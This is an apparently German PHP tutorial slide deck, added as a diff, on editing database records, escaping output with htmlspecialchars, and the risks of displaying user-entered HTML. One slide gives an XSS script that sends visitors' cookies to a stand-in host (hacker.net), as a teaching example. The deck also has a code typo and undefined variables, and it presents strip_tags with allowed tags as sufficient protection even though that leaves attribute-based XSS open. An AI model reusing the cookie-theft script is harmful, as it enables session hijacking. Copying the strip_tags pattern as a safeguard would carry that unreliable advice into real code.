@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>Daten Bearbeiten - als Präsentation </title>
+	<meta name="viewport" content="width=1024, user-scalable=no">
+	
+	<!-- Replace path with correct path to deck.core.css. -->
+	<link rel="stylesheet" href="/assets/css/deck.core.css" type="text/css">
+	<link rel="stylesheet" href="/assets/css/style-theme.css" type="text/css">
+	<link rel="stylesheet" href="/assets/css/transition-theme.css" type="text/css">
+        <link rel="stylesheet" href="/assets/css/deck.goto.css">
+        <link rel="stylesheet" href="/assets/css/deck.status.css">
+        <link rel="stylesheet" href="/assets/css/deck.hash.css">
+        <link rel="stylesheet" href="/assets/css/style.css">
+        <style>
+          /* google code prettify */
+          li.L0, li.L1, li.L2, li.L3, li.L5, li.L6, li.L7, li.L8 {
+              list-style-type: inherit !important;
+          }
+          li.L1, li.L3, li.L5, li.L7, li.L9 {
+            background: none repeat scroll 0 0 #EEFEEE;
+          }
+          ol.linenums {
+            margin-left: 80px !important;
+          }
+
+          /* deck */
+          h4.caption { color: #999999; }
+          h4.caption small { color: black; }
+          table.table-bordered {
+            border-collapse: separate;
+          }
+          table.table-bordered td,
+          table.table-bordered th
+          {
+            border: 2px white solid;
+            padding: 2px;
+          }
+
+          .slide img[src$=svg] {
+            width: 100%;
+          }
+        </style>
+  
+	
+	<!-- Any other extension CSS files go here. -->
+	
+	<!-- Replace path with correct path to Modernizr file. -->
+	<script src="/assets/js/modernizr.custom.js"></script>
+</head>
+<body class="deck-container">
+
+<!-- Create any number of elements with class slide within the container -->
+          <div class="slide"><h1>Daten Bearbeiten</h1>
+          <p><a href="/php-db-schreiben/daten-editieren/">zurück zum Buch-Kapitel [esc]</a></p>
+          </div>
+	  <div class='slide'>
+<p>Wir wollen einen Datensatz aus der Datenbank laden, in einem Formular zur
+Bearbeitung anbieten, und dann wieder in der Datenbank speichern.</p>
+
+<p><img src="/images/person_edit.png" alt="Formular zum Bearbeiten einer Person" /></p>
+
+<p>Das Lesen des Datensatzes aus der Datenbank erfolgt nun auch mit einem prepared Statement,
+da die ID aus dem GET-Parameter gelesen wurde:</p>
+
+<div class="example">
+<h4 class="caption">Php Code <small>laden des Datensatzes, der editiert werden soll</small></h4>
+<pre class="lang-php prettyprint linenums">
+$sth = $dbh-&gt;prepare( &quot;SELECT * FROM users WHERE id=?&quot; );
+$sth-&gt;execute( array( $id ) );
+$person = $sth-&gt;fetch();
+</pre></div>
+
+</div>
+<div class='slide'>
+
+<h3 id="das-bearbeitungs-formular">Das Bearbeitungs-Formular</h3>
+
+<p>Bei der Darstellung des Bearbeitungs-Formulars werden die Daten nun als
+Standardwerte dargestellt. Das passiert bei Textfeldern mit dem Value-Attribute
+und bei Textareas als Inhalt des Tags:</p>
+
+<div class="example">
+<pre class="lang-html prettyprint linenums">
+&lt;input name=&quot;firstname&quot; value=&quot;Tobias&quot;&gt;
+&lt;textarea name=&quot;description&quot; rows=&quot;7&quot;&gt;Webdesigner&lt;/textarea&gt;
+</pre></div>
+
+<p>Achtung: Falls in den Daten Anführungszeichen, kaufmännische Unds oder
+Kleiner-Zeichen vorkommen müssen diese für HTML escaped werden.  Hier ein
+Beispiel in MySQL:</p>
+
+<div class="example">
+<pre class="lang-sql prettyprint linenums">
+MariaDB [portfolio_playground]&gt; select firstname,description from users where id=438;
++--------------------+--------------------------------+
+| firstname          | description                    |
++--------------------+--------------------------------+
+| Tobias &quot;der Coder&quot; | Mein Lieblings-Tag ist &lt;style&gt; |
++--------------------+--------------------------------+
+1 row in set (0.00 sec)
+</pre></div>
+
+<p>So würde die Darstellung der Eingabefelder nicht funktionieren:</p>
+
+<div class="example">
+<pre class="lang-html prettyprint linenums">
+&lt;input name=&quot;firstname&quot; value=&quot;Tobias &quot;the Coder&quot;&quot;&gt;
+&lt;textarea name=&quot;description&quot; rows=&quot;7&quot;&gt;Mein Lieblings-Tag ist &lt;style&gt;&lt;/textarea&gt;
+</pre></div>
+
+<p>Das Attribut <code>value</code> endet zu früh, und der <code>&lt;style&gt;</code> Tag lässt
+den Rest der Webseite verschwinden.</p>
+
+</div>
+<div class='slide'>
+
+
+
+<p>Richtig ist die Darstellung gewisser Zeichen als HTML Entities:</p>
+
+<div class="example">
+<pre class="lang-html prettyprint linenums">
+&lt;input name=&quot;firstname&quot; value=&quot;Tobias &amp;quot;the coder&amp;quot;&quot;&gt;
+&lt;textarea name=&quot;description&quot; rows=&quot;7&quot;&gt;Mein Lieblings-Tag ist &amp;lt;style&amp;gt;&lt;/textarea&gt;
+</pre></div>
+
+<p>Diese Ersetzung wird mit der Funktion
+<code>htmlspecialchars</code><a href="http://www.php.net/manual/en/function.htmlspecialchars.php">→</a> vorgenommen:</p>
+
+<div class="example">
+<pre class="lang-php prettyprint linenums">
+htmlspecialchars( $person-&gt;firstname );
+</pre></div>
+
+</div>
+<div class='slide'>
+
+
+
+<p>Zusammenfassend sieht die Darstellung des Eingabeformulars so aus:</p>
+
+<div class="example">
+<h4 class="caption">Php Code <small>Darstellung eines Eingabe-Felds des Edit-Formulars mit PHP</small></h4>
+<pre class="lang-php prettyprint linenums">
+&lt;input name=&quot;firstname&quot; value=&quot;&lt;?php echo htmlspecialchars( $person-&gt;firstname ) ?&gt;&quot;&gt;
+&lt;textarea name=&quot;description&quot; rows=&quot;7&quot;&gt;&lt;?php echo htmlspecialchars( $person-&gt;description ) ?&gt;&lt;/textarea&gt;
+</pre></div>
+
+</div>
+<div class='slide'>
+
+<h3 id="verarbeitung-des-post-request">Verarbeitung des POST-Request</h3>
+
+<p>Die veränderten Daten werden mit POST an person_edit.php geschickt. Aus den Daten wird ein UPDATE-Statement erstellt:</p>
+
+<div class="example">
+<h4 class="caption">Php Code <small>Update der Daten von PHP aus</small></h4>
+<pre class="lang-php prettyprint linenums">
+$sth = $dbh-&gt;prepare(
+  &quot;UPDATE users SET
+    firstname=?,surname=?,email=?,
+    profile_visible=?,description=? 
+   WHERE id=?&quot;);
+
+$update_went_ok = $sth-&gt;execute(
+  array(
+    $_POST[&#39;firstname&#39;],
+    $_POST[&#39;surname&#39;],
+    $_POST[&#39;email&#39;],
+    $_POST[&#39;profile_visible&#39;],
+    $_POST[&#39;description&#39;],
+    $_POST[&#39;id&#39;]
+  )
+);
+
+header(&quot;Location: person.php?id=&quot; . $_POST[&#39;id&#39;]);
+exit;
+</pre></div>
+
+</div>
+<div class='slide'>
+
+<h2 id="escapen-von-html">Escapen von HTML</h2>
+<p>Das Escapen der Daten für HTML hätten wir von Anfang an bei jeder Ausgabe von Daten aus der Datenbank durchführen müssen. Wir haben bisher einfach die Daten direkt mit echo ausgegeben:</p>
+
+<div class="example">
+<h4 class="caption">Php Code <small>Ausgabe von Daten aus der Datenbank ohne html-escaping</small></h4>
+<pre class="lang-php prettyprint linenums">
+&lt;?php echo $person-&gt;firstname ?&gt;
+&lt;?php echo $person-&gt;surname ?&gt;
+hat insgesamt  &lt;?php echo $no ?&gt; Werke in dieser Datenbank.
+// problematisch!
+</pre></div>
+
+</div>
+<div class='slide'>
+
+
+
+<p>Wenn hier in der Description „Mein Lieblings-Tag ist &lt;style&gt;“ steht, und dieser Text einfach ausgegeben wird, dann „verschwindet“ der Rest der Webseite, weil er sich nun innerhalb eines Style-Tags befindet.</p>
+
+<div class="example">
+<h4 class="caption">Php Code <small>Ausgabe von Daten aus der Datenbank mit html-escaping</small></h4>
+<pre class="lang-php prettyprint linenums">
+$username    = htmlspecialchars( $person-&gt;username     );
+$firstname   = htmlspecialchars( $person-&gt;firstname    );
+$surname     = htmlspecialchars( $person-&gt;surname      );
+$description = htmlspecialchars( $person-&gt;description&#39; );
+
+echo &lt;&lt;&lt;EOM
+  &lt;p&gt;$anrede $vorname $nachname hat insgesamt 
+  $no Werke in dieser Datenbank.
+  $ersie hat den Usernamen $username.&lt;/p&gt;
+
+  &lt;div&gt;$description&lt;/div&gt;
+EOM;
+</pre></div>
+
+<p>Damit funktioniert nun die Darstellung des Datensatzes richtig:</p>
+
+<p><img src="/images/html-escaped1.png" alt="Korrekte Darstellung eines Datensatzes mit kleiner-Zeichen" /></p>
+
+</div>
+<div class='slide'>
+
+<h2 id="darstellen-von-html">Darstellen von HTML</h2>
+<p>Im letzten Beispielen wurde der eingegebene HTML-Tag sichtbar auf der Webseite
+angezeigt. Wie kann man HTML-Tags eingeben, abspeichern, und als HTML-Tags
+wieder anzeigen?</p>
+
+</div>
+<div class='slide'>
+
+<h3 id="gefahren">Gefahren</h3>
+<p>Zuerst eine Warnung: Die Anzeige von HTML das von Fremden eingegeben wurde ist
+gefährlich! Dazu zwei Beispiele: Sie bauen ein Gästebuch in dem BesucherInnen
+beliebiges HTML abspeichern können. Herr Lauscher trägt dort ein Bild ein:</p>
+
+<div class="example">
+<pre class="lang-html prettyprint linenums">
+&lt;img src=&quot;http://lauscher.net/bild.php?woher=gaestebuch_mmt&quot; alt=&quot;harmloses bild&quot;&gt;
+</pre></div>
+
+<p>Das Bild wird also nicht von Ihrem Webserver geladen, sondern vom Webserver von
+Herrn Lauscher. Und dort wird gleich ein php-Programm zum Erzeugen des Bildes
+aufgerufen. D.h. Herr Lauscher kann sehr bequem mit-loggen wie viele Zugriffe
+auf das Gästebuch erfolgen. Falls Herr Lauscher die Gästebuch-Besucher schon
+kennt (schon ein Cookie in Ihrem Browser gesetzt hat) kann er sie auch
+identifizieren.</p>
+
+<p>Sie haben Herrn Lauscher also die Möglichkeit gegeben sehr viel über Ihre
+BesucherInne zu erfahren. So etwas ähnliches passiert z.B. wenn Sie Google
+Analytics in Ihre Webseite einbinden um Zugriffs-Statistiken zu erstellen:
+Google erfährt von jedem Zugriff auf Ihre Seite, Google kennt viele
+BesucherInnen schon (weil Sie bei gmail.com eingeloggt sind oder von einer
+vorhergehenden Suche noch ein Cookie haben.)</p>
+
+</div>
+<div class='slide'>
+
+
+
+<p>Im zweiten Beispiel gibt Frau Hacker neben einem Bild noch etwas Javascript ein:</p>
+
+<div class="example">
+<pre class="lang-html prettyprint linenums">
+Hallo Welt 
+
+&lt;img src=&quot;http://hacker.net/bild.php&quot; alt=&quot;harmloses bild&quot; id=&quot;hack_tool&quot; /&gt;
+&lt;script&gt;
+   document.getElementById(&quot;hack_tool&quot;).src += &quot;?keks=&quot; + document.cookie;
+&lt;/script&gt;
+</pre></div>
+
+<p>Mit der einen Zeile Javascript wir das Cookie an die URL des Bildes angefügt, das Ergebnis ist z.B:</p>
+
+<div class="example">
+<pre class="lang-html prettyprint linenums">
+&lt;img id=&quot;hack_tool&quot; alt=&quot;harmloses bild&quot; 
+src=&quot;http://hacker.net/bild.php?keks=PHPSESSID=6b454e966f9fc9b9a9d5126ffb076115&quot;/&gt;
+</pre></div>
+
+<p>So kann Frau Hacker das Cookie einer BesucherIn Ihres Gästebuchs entwenden. Sie
+kann nun das Cookie verwenden um als eingeloggter User Ihre Seite zu benützen!</p>
+
+<p>Lassen Sie niemals, niemals, niemals zu, dass Fremde Javascript in Ihre Site einspeisen können!</p>
+
+</div>
+<div class='slide'>
+
+
+
+<p>Noch hat unsere Applikation dieses Problem nicht: Wenn Frau Hacker Ihren Code
+z.B. in das Profil einer Person eingibt wir der Code htmlescaped angezeigt und
+„wirkt nicht“:</p>
+
+<p><img src="/images/html-escaped.png" alt="Eingegebener HTML+Javascript-Code wird escaped und dargestellt" /></p>
+
+</div>
+<div class='slide'>
+
+<h3 id="eingabe-von-html">Eingabe von HTML</h3>
+
+<p>Die Eingabe des HTML-Codes können Sie mit einem Javascript-Editor wie TinyMCE
+erleichtern. TinyMCE verwandelt eine normale Textarea in einen wysiwyg-Editor:</p>
+
+<p><img src="/images/tinymce.png" alt="Normale Textarea (oben) kann mit TinyMCE in einen wysiwyg-Editor (unten) verwandelt werden" /></p>
+
+<p>Mit HTML5 gibt es auch die Möglichkeit ohne Textfeld, mit content-editable einen
+Editor zu erstellen. Ein Beispiel dafür ist der Aloha Editor:</p>
+
+<p><img src="/images/aloha.png" alt="Aloha Editor" /></p>
+
+</div>
+<div class='slide'>
+
+<h3 id="behandlugn-von-eingegebenem-html">Behandlugn von eingegebenem HTML</h3>
+
+<p>Für die Beispiel-Applikation wollen wir Zulassen, dass im Profil die HTML-Tags
+<code>&lt;p&gt;</code> und <code>&lt;b&gt;</code> verwendet werden können, mehr nicht. Dass es nur diese
+Tags und keine anderen sind wird bei der Eingabe und der Bearbeitung sicher
+gestellt:</p>
+
+<div class="example">
+<pre class="lang-php prettyprint linenums">
+$description = strip_tags( $_POST[&#39;description&#39;], &quot;&lt;p&gt;&lt;b&gt;&quot; );
+</pre></div>
+
+<p>Nun können Sie auch die Ausgabe des Profils umstellen und auf das escapen 
+der <code>description</code> verzichten:</p>
+
+<div class="example">
+<h4 class="caption">Php Code <small>Ausgabe von Daten aus der Datenbank mit html-escaping</small></h4>
+<pre class="lang-php prettyprint linenums">
+$username    = htmlspecialchars( $person-&gt;username     );
+$firstname   = htmlspecialchars( $person-&gt;firstname    );
+$surname     = htmlspecialchars( $person-&gt;surname      );
+$description = strip_tags( $person-&gt;description,  &quot;&lt;p&gt;&lt;b&gt;&quot; );
+
+echo &lt;&lt;&lt;EOM
+  &lt;p&gt;$anrede $vorname $nachname hat insgesamt 
+  $no Werke in dieser Datenbank.
+  $ersie hat den Usernamen $username.&lt;/p&gt;
+
+  &lt;div&gt;$description&lt;/div&gt;
+EOM;
+</pre></div>
+
+</div>
+          <div class="slide"><h1>Ende</h1>
+          <p><a href="/php-db-schreiben/daten-editieren/">zurück zum Buch-Kapitel [esc]</a></p>
+          </div>
+	
+<!-- Other extension HTML snippets go here, at the bottom of the deck container. -->
+<!-- deck.status snippet -->
+<p class="deck-status">
+  <span class="deck-status-current"></span>
+  /
+  <span class="deck-status-total"></span>
+</p>
+
+<!-- deck.hash snippet -->
+<a href="." title="Permalink to this slide" class="deck-permalink">#</a>
+
+<!-- Update these paths to point to the correct files. -->
+<script src="/assets/js/jquery.min.js"></script>
+<script src="/assets/js/deck.core.js"></script>
+<script src="/assets/js/deck.hash.js"></script>
+<script src="/assets/js/deck.goto.js"></script>
+<script src="/assets/js/deck.status.js"></script>
+
+<!-- Add any other extension JS files here -->
+<script src="/assets/js/deck.escape.js"></script>
+
+<script src="https://google-code-prettify.googlecode.com/svn/loader/run_prettify.js"></script>
+
+<!-- Initialize the deck. You can put this in an external file if desired. -->
+<script>
+  $(function() {
+    $.deck('.slide');
+  });
+</script>
+</body>
+</html>
